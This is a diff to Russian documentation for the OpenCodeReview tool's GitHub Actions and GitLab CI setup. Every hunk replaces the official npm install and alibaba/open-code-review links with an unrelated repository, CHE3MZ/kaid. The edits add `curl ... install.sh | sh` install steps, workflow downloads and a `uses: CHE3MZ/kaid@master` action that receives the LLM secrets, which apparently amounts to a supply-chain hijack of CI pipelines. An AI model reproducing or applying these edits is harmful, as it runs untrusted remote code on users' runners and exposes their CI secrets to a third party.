@@ -18,7 +18,7 @@ GitLab CI ниже представляют её конкретные реали
 1. **Запуск по событию PR / MR.** Новый pull request, обновлённый merge request
    или ручной комментарий `/open-code-review` запускает задачу.
 2. **Установка `ocr`** на runner, обычно командой
-   `npm install -g @alibaba-group/open-code-review`. Runner временный, поэтому
+   `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`. Runner временный, поэтому
    это выполняется при каждом запуске.
 3. **Настройка LLM** из секретов CI с помощью `ocr config set` (эндпоинт,
    токен, модель). Сохранённого `~/.opencodereview`, который можно было бы
@@ -55,7 +55,7 @@ GitLab CI ниже представляют её конкретные реали
 ## GitHub Actions
 
 Исходный workflow находится в
-[`examples/github_actions/ocr-review.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/github_actions/ocr-review.yml).
+[`examples/github_actions/ocr-review.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/github_actions/ocr-review.yml).
 
 ### Что он делает
 
@@ -66,7 +66,7 @@ GitLab CI ниже представляют её конкретные реали
   вместо `pull_request`, чтобы секреты были доступны даже для PR из форков;
   OCR только читает diff и не выполняет код из PR.)
 - Устанавливает OCR командой
-  `npm install -g @alibaba-group/open-code-review`, записывает конфигурацию с
+  `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh`, записывает конфигурацию с
   помощью `ocr config set`, затем запускает основную команду в режиме диапазона
   веток.
 - Разбирает объект JSON и публикует каждое замечание как встроенный комментарий
@@ -81,7 +81,7 @@ GitLab CI ниже представляют её конкретные реали
 ```bash
 mkdir -p .github/workflows
 curl -o .github/workflows/ocr-review.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/github_actions/ocr-review.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/github_actions/ocr-review.yml
 ```
 
 ### Необходимые секреты
@@ -107,8 +107,8 @@ curl -o .github/workflows/ocr-review.yml \
 ### Параметры action
 
 Исходный workflow делегирует ревью переиспользуемому составному action
-([`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml))
-через `uses: alibaba/open-code-review@main`. Помимо учётных данных выше,
+([`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml))
+через `uses: CHE3MZ/kaid@master`. Помимо учётных данных выше,
 эти входные параметры настраивают само ревью — передавайте их в `with:` шага
 action:
 
@@ -120,7 +120,7 @@ action:
 | `stream_progress` | `'false'` | Значение `'true'` транслирует живые строки прогресса `[ocr]` в лог workflow (human audience в stderr) вместо молчания до конца запуска. Влияет только на отображение: stderr по-прежнему записывается в файл для артефактов и публикации комментариев. |
 
 ```yaml
-- uses: alibaba/open-code-review@main
+- uses: CHE3MZ/kaid@master
   with:
     llm_url: ${{ secrets.OCR_LLM_URL }}
     llm_auth_token: ${{ secrets.OCR_LLM_AUTH_TOKEN }}
@@ -133,7 +133,7 @@ action:
 ```
 
 Полный список параметров см. в
-[`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml) —
+[`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml) —
 включая режимы публикации (`sticky_summary`, `incremental`), маршрутизацию по
 важности/категориям и чекпоинты между пушами.
 
@@ -237,7 +237,7 @@ if: |
 
 ```yaml
 - name: Install OpenCodeReview
-  run: npm install -g @alibaba-group/open-code-review@1.0.0
+  run: curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### Публикация от имени GitHub App
@@ -337,7 +337,7 @@ review (или `ocr scan`).
 ## GitLab CI
 
 Исходный конвейер находится в
-[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/gitlab_ci/.gitlab-ci.yml).
+[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/gitlab_ci/.gitlab-ci.yml).
 
 ### Что он делает
 
@@ -357,7 +357,7 @@ review (или `ocr scan`).
 
 ```bash
 curl -o .gitlab-ci.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/gitlab_ci/.gitlab-ci.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/gitlab_ci/.gitlab-ci.yml
 ```
 
 Если у вас уже есть `.gitlab-ci.yml` и вы хотите его сохранить, добавьте рецепт
@@ -435,7 +435,7 @@ script:
 
 ```yaml
 script:
-  - npm install -g @alibaba-group/open-code-review@1.0.0
+  - curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### Как избежать повторного ревью при каждой отправке
